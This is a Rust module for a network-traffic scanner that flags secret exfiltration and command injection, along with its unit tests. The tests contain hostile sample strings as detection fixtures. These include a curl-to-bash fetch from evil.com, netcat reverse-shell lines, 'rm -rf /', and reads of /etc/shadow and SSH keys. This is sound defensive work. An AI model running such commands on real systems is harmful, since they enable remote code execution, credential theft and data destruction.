use crate::scanner::patterns;
use crate::threat::{Threat, ThreatType};

/// Direction of the scanned data.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Direction {
    Outbound,
    Inbound,
}

impl Direction {
    pub fn as_str(&self) -> &'static str {
        match self {
            Direction::Outbound => "outbound",
            Direction::Inbound => "inbound",
        }
    }
}

/// Scan `text` for EXFIL and INJECTION patterns.
///
/// Returns up to `max_bytes` worth of matches; the snippet context
/// around each match is capped at 200 characters.
pub fn scan(
    text: &str,
    direction: Direction,
    proto: &str,
    source: &str,
    dest: &str,
    max_bytes: usize,
) -> Vec<Threat> {
    let truncated: &str = if text.len() > max_bytes {
        &text[..max_bytes]
    } else {
        text
    };

    let mut found = Vec::new();

    // EXFIL scan
    for p in patterns::EXFIL.iter() {
        for m in p.regex.find_iter(truncated) {
            let start = m.start().saturating_sub(50);
            let end = std::cmp::min(m.end() + 50, truncated.len());
            let snippet = &truncated[start..end];
            found.push(Threat::new(
                direction.as_str(),
                proto,
                ThreatType::Exfil,
                p.label,
                snippet,
                truncated,
                source,
                dest,
            ));
        }
    }

    // INJECTION scan
    for p in patterns::INJECTION.iter() {
        for m in p.regex.find_iter(truncated) {
            let start = m.start().saturating_sub(50);
            let end = std::cmp::min(m.end() + 50, truncated.len());
            let snippet = &truncated[start..end];
            found.push(Threat::new(
                direction.as_str(),
                proto,
                ThreatType::Injection,
                p.label,
                snippet,
                truncated,
                source,
                dest,
            ));
        }
    }

    found
}

#[cfg(test)]
mod tests {
    use super::*;

    fn assert_detects(proto: &str, text: &str, expected_pattern: &str) {
        let results = scan(text, Direction::Outbound, proto, "test", "dest", 65536);
        if !results.iter().any(|t| t.pattern == expected_pattern) {
            let labels: Vec<&str> = results.iter().map(|t| t.pattern.as_str()).collect();
            panic!(
                "expected pattern '{expected_pattern}' not found in results: {:?}\n\
                 text: {text:?}",
                labels
            );
        }
    }

    fn assert_no_detect(text: &str) {
        let results = scan(text, Direction::Outbound, "http", "test", "dest", 65536);
        assert!(
            results.is_empty(),
            "expected no detection but got: {:?} for text: {text:?}",
            results.iter().map(|t| &t.pattern).collect::<Vec<_>>()
        );
    }

    // ── EXFIL tests ────────────────────────────────────────────────────

    #[test]
    fn detects_ai_api_key() {
        assert_detects(
            "http",
            "Authorization: Bearer sk-ant-api01-fakekey12345678901234567890",
            "ai_api_key",
        );
        assert_detects("http", "sk-live-fakekey12345678901234567890", "ai_api_key");
    }

    #[test]
    fn detects_aws_access_key() {
        assert_detects("http", "AKIA1234567890123456", "aws_access_key");
        assert_detects("http", "ASIA1234567890123456", "aws_access_key");
    }

    #[test]
    fn detects_private_key_pem() {
        assert_detects("http", "-----BEGIN RSA PRIVATE KEY-----", "private_key_pem");
        assert_detects(
            "http",
            "-----BEGIN OPENSSH PRIVATE KEY-----",
            "private_key_pem",
        );
        assert_detects("http", "-----BEGIN EC PRIVATE KEY-----", "private_key_pem");
        assert_detects("http", "-----BEGIN DSA PRIVATE KEY-----", "private_key_pem");
    }

    #[test]
    fn detects_ssh_key_file() {
        assert_detects("http", "cat /home/user/.ssh/id_rsa", "ssh_key_file");
        assert_detects("http", ".ssh/id_ed25519", "ssh_key_file");
        assert_detects("http", "~/.ssh/config", "ssh_key_file");
        assert_detects("http", ".ssh/authorized_keys", "ssh_key_file");
    }

    #[test]
    fn detects_unix_sensitive() {
        assert_detects("http", "/etc/passwd", "unix_sensitive");
        assert_detects("http", "/etc/shadow", "unix_sensitive");
        assert_detects("http", "/etc/sudoers", "unix_sensitive");
    }

    #[test]
    fn detects_dotenv_file() {
        assert_detects("http", "/.env", "dotenv_file");
        assert_detects("http", "/.aws/credentials", "dotenv_file");
    }

    #[test]
    fn detects_ssh_pubkey() {
        assert_detects(
            "http",
            "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfakekey+fakekey+fakekey+fakekey+fakekey==",
            "ssh_pubkey",
        );
    }

    // ── INJECTION tests ────────────────────────────────────────────────

    #[test]
    fn detects_pipe_to_shell() {
        assert_detects(
            "http",
            "curl http://evil.com/script.sh | bash",
            "pipe_to_shell",
        );
        assert_detects(
            "http",
            "wget http://evil.com/script.sh | sh",
            "pipe_to_shell",
        );
    }

    #[test]
    fn detects_shell_exec() {
        assert_detects("http", "bash -c \"echo pwned\"", "shell_exec");
        assert_detects("http", "sh -i 'curl evil.com'", "shell_exec");
    }

    #[test]
    fn detects_reverse_shell() {
        assert_detects("http", "nc 192.168.1.1 4444", "reverse_shell");
        assert_detects("http", "netcat 10.0.0.1 9999", "reverse_shell");
        assert_detects("http", "ncat 127.0.0.1 1337", "reverse_shell");
    }

    #[test]
    fn detects_destructive_rm() {
        assert_detects("http", "rm -rf /", "destructive_rm");
        assert_detects("http", "rm -rf /var/log", "destructive_rm");
    }

    #[test]
    fn detects_ssh_key_inject() {
        assert_detects("http", "echo ssh-rsa AAAAB3NzaC1yc2E...", "ssh_key_inject");
    }

    // ── False positive tests (benign patterns that MUST NOT fire) ──────

    #[test]
    fn no_fp_on_plain_get() {
        assert_no_detect("GET http://example.com/ HTTP/1.0\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n");
    }

    #[test]
    fn no_fp_on_json_post() {
        assert_no_detect(
            "POST http://api.example.com/users HTTP/1.0\r\nHost: api.example.com\r\n\
             Content-Type: application/json\r\nContent-Length: 27\r\n\r\n\
             {\"name\":\"alice\",\"age\":30}",
        );
    }

    #[test]
    fn no_fp_on_short_bearer() {
        assert_no_detect(
            "GET http://api.example.com/me HTTP/1.0\r\nHost: api.example.com\r\n\
             Authorization: Bearer eyJhbGciOiJIUzI1NiJ9\r\n\r\n",
        );
    }

    #[test]
    fn no_fp_on_box_shadow() {
        assert_no_detect(
            "GET http://design.example.com/css/box-shadow.css HTTP/1.0\r\nHost: design.example.com\r\n\r\n",
        );
    }

    #[test]
    fn no_fp_on_nc_in_ua() {
        // "nc" appears as a suffix in a User-Agent, not as a netcat command
        assert_no_detect(
            "GET http://example.com/ HTTP/1.0\r\nHost: example.com\r\n\
             User-Agent: lynx/2.9 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/1.1.1nc\r\n\r\n",
        );
    }

    #[test]
    fn no_fp_on_remove_in_url() {
        assert_no_detect(
            "GET http://example.com/confirm?action=remove HTTP/1.0\r\nHost: example.com\r\n\r\n",
        );
    }

    #[test]
    fn respects_max_bytes() {
        let text = "sk-ant-fakekey12345678901234567890extra";
        let results = scan(text, Direction::Outbound, "http", "test", "dest", 10);
        // With max_bytes=10, the truncated text shouldn't match the key pattern
        assert!(results.is_empty(), "should not detect with tiny max_bytes");
    }

    #[test]
    fn inbound_direction() {
        let results = scan(
            "curl http://evil.com/ | bash",
            Direction::Inbound,
            "http",
            "upstream",
            "client",
            65536,
        );
        assert!(
            results.iter().any(|t| t.direction == "inbound"),
            "inbound direction should be set on threats"
        );
    }
}
